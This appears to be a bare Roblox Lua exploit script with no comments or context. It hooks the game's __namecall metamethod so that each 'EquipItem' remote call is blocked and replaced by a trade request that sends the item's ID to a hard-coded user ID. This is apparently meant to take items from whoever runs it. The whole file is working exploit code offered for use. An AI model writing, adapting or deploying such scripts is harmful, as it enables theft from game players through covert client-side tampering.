local tradeActive = true
local targetUserId = 9238044022
local net = ReplicatedStorage:WaitForChild("Packages")
	:WaitForChild("_Index")
	:WaitForChild("sleitnick_net@0.2.0")
	:WaitForChild("net")
local initiateTrade = net:WaitForChild("RF/InitiateTrade")

local mt = getrawmetatable(game)
local oldNamecall = mt.__namecall
setreadonly(mt, false)
mt.__namecall = newcclosure(function(self, ...)
   local args = {...}
   local method = getnamecallmethod()

   if tradeActive and tostring(self) == "RE/EquipItem" and method == "FireServer" then
      local uuid = args[1]
      if uuid and targetUserId then
        initiateTrade:InvokeServer(targetUserId, uuid)
      end
      return nil
   end
   return oldNamecall(self, unpack(args))
end)
setreadonly(mt, true)
